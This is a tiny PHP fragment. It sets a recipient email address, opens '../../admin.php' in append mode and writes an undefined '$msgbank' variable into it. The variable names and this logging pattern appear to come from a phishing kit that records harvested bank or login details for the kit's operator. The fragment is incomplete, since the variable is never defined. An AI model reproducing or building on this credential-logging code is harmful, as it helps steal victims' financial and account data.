<?php

$yourmail  = 'anas@mailvat.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>